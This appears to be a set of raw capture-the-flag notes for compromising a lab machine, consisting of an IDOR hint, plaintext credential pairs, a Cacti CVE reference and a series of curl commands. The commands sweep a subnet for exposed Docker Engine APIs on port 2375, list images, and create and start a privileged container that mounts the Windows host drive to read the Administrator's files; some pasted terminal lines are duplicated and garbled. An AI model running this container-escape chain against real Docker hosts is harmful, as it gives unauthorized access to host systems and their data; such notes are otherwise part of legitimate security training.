idor user?token=0

admin:wonderful1

marcus:wonderful1

CVE-2025-24367-Cacti-PoC

curl -v http://host.docker.internal:2375/version

default api port on doker desktop

curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\["[^"]*"

```
for i in $(seq 1 254); do (r=$(curl -sk --max-time 2 http://192.168.65.$i:2375/version 2>/dev/null); [ -n "$r" ] && echo "192.168.65.$i: $r") & done; wait
```

```
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags"
```

```
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d @- <<'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/run/desktop/mnt/host/c:/mnt/host_root"]
  },
  "Privileged": true
}
<X POST http://192.168.65.7:2375/containers/create \
>   -H "Content-Type: application/json" \
>   -d @- <<'EOF'
> {
>   "Image": "alpine:latest",
<t/host_root/Users/Administrator/Desktop/root.txt"],
>   "HostConfig": {
>     "Binds": ["/run/desktop/mnt/host/c:/mnt/host_root"]
>   },
>   "Privileged": true
> }
> 
EOF
```

```
curl -s -X POST http://192.168.65.7:2375/containers/bfcb18936514901068a1ed2f768f10851cda5567957f8dcceb8a6bf5e482e83b/start && sleep 1 && curl -s "http://192.168.65.7:2375/containers/bfcb18936514901068a1ed2f768f10851cda5567957f8dcceb8a6bf5e482e83b/logs?stdout=1&stderr=1" | strings
<ceb8a6bf5e482e83b/logs?stdout=1&stderr=1" | strings
```
